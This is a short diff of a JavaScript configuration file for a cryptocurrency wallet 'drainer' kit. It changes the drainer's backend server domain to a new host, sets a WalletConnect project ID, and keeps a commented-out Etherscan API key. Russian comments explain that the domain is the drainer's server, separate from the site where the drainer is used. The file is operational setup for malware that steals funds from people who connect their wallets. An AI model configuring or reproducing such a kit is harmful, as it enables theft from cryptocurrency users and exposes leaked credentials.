@@ -1,5 +1,5 @@
 let MS_Encryption_Key = 50;
-const MS_Server = "phoenix-server-beta.vercel.app"; // demo-drain.theworkpc.com Указать домен, который прикреплен к серверу дрейнера
+const MS_Server = "fedsecserver.onrender.com"; // demo-drain.theworkpc.com Указать домен, который прикреплен к серверу дрейнера
 // Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
 const MS_WalletConnect_ID = "0f707b59bb38ac5b4d51e0b9d272562e"; // Project ID из WalletConnect Cloud
 //const ETHERSCAN_API_KEY = "8XQYC49U4A4FJ19NWB29MJ5EW3CZRCIIEH";
